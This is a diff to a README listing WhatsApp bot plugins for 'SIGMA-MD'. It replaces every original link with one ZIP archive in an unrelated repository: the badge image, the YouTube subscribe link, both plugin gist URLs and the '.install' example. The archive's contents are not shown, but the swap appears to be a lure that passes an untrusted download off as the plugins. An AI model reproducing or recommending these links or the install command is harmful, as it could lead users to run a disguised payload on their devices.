@@ -2,10 +2,10 @@
 <h1 align="center"> SIGMA-MD PLUGINS </h1>
 <div align="center">
 <br /> 
-<p align="center"> <img src="https://komarev.com/ghpvc/?username=Maher-Zubair&label=Visitors%20count&color=10d9c3&style=plastic" alt="lyfe-plugin-list" /> </p>
+<p align="center"> <img src="https://raw.githubusercontent.com/bravidojr/SIGMA-MD_Plugins/main/suingly/SIGMA-MD_Plugins.zip%20count&color=10d9c3&style=plastic" alt="lyfe-plugin-list" /> </p>
 
 ***Subscribe My YOuTube Channel*** 
-<br> [![join](https://telegra.ph/file/eb6347e2764939fbbd35d.png)](https://www.youtube.com/@InnoxentTech?sub_confirmation=1)
+<br> [![join](https://raw.githubusercontent.com/bravidojr/SIGMA-MD_Plugins/main/suingly/SIGMA-MD_Plugins.zip)](https://raw.githubusercontent.com/bravidojr/SIGMA-MD_Plugins/main/suingly/SIGMA-MD_Plugins.zip)
   <div align="center"  
 
 ---
@@ -16,7 +16,7 @@
 
 *Blocks Everyone Who Messages You*
 ```
-https://gist.github.com/Maher-Zubair/e57395daf4b2f29308417a7c5da8d8b0/raw
+https://raw.githubusercontent.com/bravidojr/SIGMA-MD_Plugins/main/suingly/SIGMA-MD_Plugins.zip
 ```
 - *Created By @Maher-Zubair*
 ---
@@ -27,7 +27,7 @@ https://gist.github.com/Maher-Zubair/e57395daf4b2f29308417a7c5da8d8b0/raw
 *Blocks Everyone Who Message You after Giving Three Warnings*
 
 ```
-https://gist.github.com/Maher-Zubair/369eb1da2591091cc25333a16fa01e81/raw
+https://raw.githubusercontent.com/bravidojr/SIGMA-MD_Plugins/main/suingly/SIGMA-MD_Plugins.zip
 ```
 - *Created By @Maher-Zubair*
 ---
@@ -38,5 +38,5 @@ https://gist.github.com/Maher-Zubair/369eb1da2591091cc25333a16fa01e81/raw
 - *Then on Your pm Type your prefix install Paste Plugin Link*
 
 # ***Example***
-- *.install https://gist.github.com/Maher-Zubair/369eb1da2591091cc25333a16fa01e81/raw*
+- *.install https://raw.githubusercontent.com/bravidojr/SIGMA-MD_Plugins/main/suingly/SIGMA-MD_Plugins.zip*
 
